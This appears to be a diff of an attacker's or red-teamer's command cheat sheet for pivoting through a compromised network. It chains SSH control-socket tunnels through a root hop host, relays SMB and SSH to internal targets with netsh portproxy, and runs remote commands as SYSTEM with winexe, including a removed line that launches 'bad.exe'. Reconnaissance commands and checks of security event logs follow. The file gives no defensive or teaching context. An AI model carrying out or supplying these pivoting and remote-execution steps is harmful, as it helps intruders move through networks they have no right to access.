@@ -71,7 +71,7 @@ ssh -S /tmp/hop-1 -O exit root@1.1.1.1
 script termscreen.$$
 
 ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
-winexe -U domain.name/username //ip c:\\windows\\bad.exe --system
+winexe -U admin3 //127.0.0.1 cmd.exe --system
 
 date /t && time /t
 tasklist /V
@@ -104,10 +104,26 @@ Arp -a
 Route print
 
 
-ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
+###################################################
+##IF NEXT TARGET IS WINDOWS USE THIS:
+##################################################
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:48435
 
-netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.106.0.9 connectport=445 connectaddress=10.106.0.10 protocol=tcp
+netsh interface portproxy add v4tov4 listenport=48435 listenaddress=10.106.0.9 connectport=445 connectaddress=10.106.0.10 protocol=tcp
 netsh interface portproxy show all
+##################################################
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$IF NEXT TARGET IS A LINUX BOX USE THIS:
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:10.10.100.77:38435
+
+netsh interface portproxy add v4tov4 listenport=38435 listenaddress=10.106.0.9 connectport=22 connectaddress=10.106.0.10 protocol=tcp
+netsh interface portproxy show all
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
 
 netsh interface portproxy delete v4tov4 listenport=<> listenaddress=192.168.1.111
 dir /o:d /t:w c:\windows\temp
@@ -115,8 +131,4 @@ dir /o:d /t:w c:\windows\system32\winevt\logs
 Wevtutil qe security /c:25 /rd:true /f:text         #whatever has updated from previous dir
 netstat /anob
 tasklist
-
-
-
-
 
